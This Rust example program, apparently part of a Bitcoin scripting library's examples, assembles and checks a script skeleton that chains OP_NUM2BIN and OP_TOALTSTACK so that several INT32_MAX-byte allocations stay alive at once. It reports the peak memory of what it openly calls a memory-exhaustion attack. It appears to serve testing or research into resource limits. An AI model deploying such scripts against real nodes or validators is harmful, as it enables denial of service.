mod support;

use std::env;
use std::error::Error;

use rust_bdk::{from_asm, to_asm};

// Requires a prior `cmake --build` so the local `libbdkffi` archive exists.
//
// The C++ version builds and validates a signed transaction whose script keeps
// several INT32_MAX OP_NUM2BIN allocations alive. Rust's safe API does not
// expose transaction signing/building, so this example renders the same attack
// script skeleton and asserts the assembled opcode bytes. It does not claim to
// validate the full attack transaction.

fn main() -> Result<(), Box<dyn Error>> {
    let chains = parse_chains()?;
    let asm = attack_script_asm(chains);
    let script = from_asm(&asm);
    let expected = attack_script_bytes(chains);
    if script != expected {
        return Err(support::invalid_data(format!(
            "assembled attack script {}, expected {}",
            support::encode_hex(&script),
            support::encode_hex(&expected)
        )));
    }

    let blob_gib = i32::MAX as f64 / (1024.0 * 1024.0 * 1024.0);
    let peak_gib = chains as f64 * blob_gib;

    println!("OP_NUM2BIN simultaneous memory allocation skeleton");
    println!("chains: {chains}");
    println!("blob size: {} bytes", i32::MAX);
    println!("peak memory: approximately {peak_gib:.1} GiB");
    println!("script asm: {}", to_asm(&script));
    println!("script hex: {}", support::encode_hex(&script));

    Ok(())
}

fn attack_script_asm(chains: usize) -> String {
    let mut words = Vec::new();
    for _ in 0..chains.saturating_sub(1) {
        words.push("OP_NUM2BIN");
        words.push("OP_TOALTSTACK");
    }
    words.push("OP_NUM2BIN");
    words.extend(std::iter::repeat_n(
        "OP_FROMALTSTACK",
        chains.saturating_sub(1),
    ));
    words.extend(std::iter::repeat_n("OP_DROP", chains.saturating_sub(1)));
    words.push("OP_SIZE");
    words.push("OP_NIP");
    words.join(" ")
}

fn attack_script_bytes(chains: usize) -> Vec<u8> {
    let mut bytes = Vec::new();
    for _ in 0..chains.saturating_sub(1) {
        bytes.push(0x80);
        bytes.push(0x6b);
    }
    bytes.push(0x80);
    bytes.extend(std::iter::repeat_n(0x6cu8, chains.saturating_sub(1)));
    bytes.extend(std::iter::repeat_n(0x75u8, chains.saturating_sub(1)));
    bytes.push(0x82);
    bytes.push(0x77);
    bytes
}

fn parse_chains() -> Result<usize, Box<dyn Error>> {
    let mut chains = 2;
    let mut args = env::args().skip(1);

    while let Some(arg) = args.next() {
        match arg.as_str() {
            "-n" | "--num-chains" => {
                let value = args
                    .next()
                    .ok_or_else(|| support::invalid_data("missing --num-chains value"))?;
                chains = value.parse()?;
            }
            "-h" | "--help" => {
                print_usage();
                std::process::exit(0);
            }
            other => return Err(support::invalid_data(format!("unknown argument {other}"))),
        }
    }

    if chains == 0 {
        return Err(support::invalid_data("--num-chains must be at least 1"));
    }

    Ok(chains)
}

fn print_usage() {
    println!("cargo run --example num2bin_memory_attack -- [--num-chains N]");
}
